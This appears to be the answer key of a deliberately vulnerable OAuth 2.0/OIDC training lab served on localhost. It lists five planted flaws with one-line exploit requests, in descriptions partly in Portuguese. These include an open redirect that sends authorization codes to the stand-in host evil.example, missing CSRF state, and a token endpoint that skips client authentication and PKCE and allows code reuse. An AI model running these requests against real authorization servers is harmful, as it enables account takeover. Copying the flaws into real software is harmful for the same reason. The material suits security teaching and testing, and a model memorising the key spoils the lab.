{
  "lab": "17-oauthforge",
  "base_url": "http://127.0.0.1:18817",
  "stack": "python-stdlib OAuth 2.0 / OIDC authorization server",
  "vulns": [
    {
      "id": "H1",
      "class": "open-redirect",
      "severity": "high",
      "route": "/authorize",
      "desc": "redirect_uri sem validação: o GET /authorize NÃO confere o redirect_uri contra a lista de permissões registrada do cliente, então emite o código de autorização para QUALQUER redirect_uri fornecido pelo atacante (302 no Location). O atacante rouba o código ou o token -> tomada de conta.",
      "exploit": "GET /authorize?client_id=webapp&response_type=code&redirect_uri=http://evil.example/grab -> 302 Location: http://evil.example/grab?code=... (code sent to attacker).",
      "points": 1
    },
    {
      "id": "H2",
      "class": "csrf",
      "severity": "medium",
      "route": "/authorize",
      "desc": "Missing state parameter / CSRF: the authorization flow accepts but never requires or binds a `state` value, so there is no CSRF protection on the OAuth flow (login CSRF / authorization-code injection / account linking forgery).",
      "exploit": "GET /authorize?client_id=webapp&response_type=code&redirect_uri=...  with NO state -> a code is still issued and the response confirms state_provided:false; the flow has no anti-CSRF binding.",
      "points": 1
    },
    {
      "id": "H3",
      "class": "auth",
      "severity": "high",
      "route": "/token",
      "desc": "Endpoint de token OAuth quebrado: o POST /token (a) NÃO autentica o cliente (o client_secret é ignorado), (b) aceita um código de autorização emitido com code_challenge de PKCE SEM o code_verifier (downgrade de PKCE) e (c) nunca invalida o código, então o mesmo código de autorização pode ser resgatado repetidas vezes (reuso de código) por vários tokens de acesso.",
      "exploit": "POST /token grant_type=authorization_code&code=<code>&client_id=webapp (no client_secret, no code_verifier) -> access_token. Repeat the SAME code -> another access_token (reuse).",
      "points": 1
    },
    {
      "id": "H4",
      "class": "info-disc",
      "severity": "medium",
      "route": "/token",
      "desc": "Erros verbosos: uma requisição malformada ao /token (por exemplo, um JSON de `claims` do OIDC inválido) dispara um traceback completo do Python na resposta, divulgando caminhos do código-fonte e detalhes internos.",
      "exploit": "POST /token grant_type=authorization_code&code=<valid>&claims=not-json -> 500 with full traceback.",
      "points": 1
    },
    {
      "id": "H5",
      "class": "headers",
      "severity": "low",
      "route": "*",
      "desc": "Missing security headers on all responses: no Content-Security-Policy, X-Frame-Options/frame-ancestors, X-Content-Type-Options, or HSTS.",
      "exploit": "curl -I any endpoint -> none of CSP/XFO/XCTO/HSTS present.",
      "points": 1
    }
  ]
}
